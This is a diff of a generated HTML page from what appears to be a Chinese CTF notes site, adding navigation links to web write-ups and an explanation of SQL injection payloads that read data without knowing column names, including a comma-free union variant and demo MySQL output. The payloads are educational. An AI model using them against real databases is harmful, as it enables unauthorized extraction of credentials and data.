@@ -790,6 +790,90 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3" type="checkbox" id="nav-4-3">
+    
+    <label class="md-nav__link" for="nav-4-3">
+      WriteUps
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-3">
+        WriteUps
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3-1" type="checkbox" id="nav-4-3-1">
+    
+    <label class="md-nav__link" for="nav-4-3-1">
+      HNUSEC OJ
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-3-1">
+        HNUSEC OJ
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../wp/web_302.md" title="302" class="md-nav__link">
+      302
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../wp/web_cookies.md" title="cookies" class="md-nav__link">
+      cookies
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../wp/web_hidden_message.md" title="hidden message" class="md-nav__link">
+      hidden message
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -1307,13 +1391,28 @@
 <span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span><span class="p">,</span><span class="n">zww</span><span class="p">,</span><span class="n">zww2</span><span class="p">,</span><span class="n">zww3</span> <span class="o">|</span> <span class="mi">3</span>    <span class="o">|</span>
 <span class="o">+</span><span class="c1">------+-----------------+------+</span>
 <span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
-</code></pre></div>
-payload:
+</code></pre></div></p>
+<p>payload:
 <div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="o">`</span><span class="mi">2</span><span class="o">`</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="k">c</span><span class="p">)</span>
 
 <span class="c1">-- 无逗号版本:</span>
 <span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">)</span><span class="n">m</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="o">`</span><span class="n">b</span><span class="o">`</span><span class="p">)</span><span class="n">n</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="o">`</span><span class="k">c</span><span class="o">`</span><span class="p">)</span><span class="n">t</span> <span class="k">where</span> <span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="n">x</span>
 </code></pre></div></p>
+<p>这里稍微解释一下无逗号版本的语法
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">)</span><span class="n">m</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="o">`</span><span class="n">b</span><span class="o">`</span><span class="p">)</span><span class="n">n</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="o">`</span><span class="k">c</span><span class="o">`</span><span class="p">)</span><span class="n">t</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span> <span class="n">a</span>    <span class="o">|</span> <span class="n">b</span>    <span class="o">|</span> <span class="k">c</span>        <span class="o">|</span> <span class="o">&lt;&lt;</span> <span class="err">重点看这里</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span> <span class="o">&lt;&lt;</span> <span class="err">使用</span><span class="k">where</span> <span class="mi">0</span><span class="err">去除</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+<code>(select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t</code> 会生成一个列名为a, b, c，数据为1，2，3的表</p>
+<p>使用union将目的表中的数据进行合并（此时表名还是a, b, c，详见刚开始的分析）</p>
+<p>where 0表示第一个表中不选择任何数据 </p>
 <p>总体来说，使用的还是union注入的思路，只是这里将其中的一个列换成我们要填入的payload即可</p>
 <p>注意这里需要用group_concat将<code>`2`</code>包裹，因为这一个无列名的payload会返回多行数据，而我们这里只能返回一个数据，所以可以使用group_concat将多行数据都连接起来，那么最后返回的也就是被我命名为2的列的数据了</p>
 <h3 id="_2">比较注入</h3>
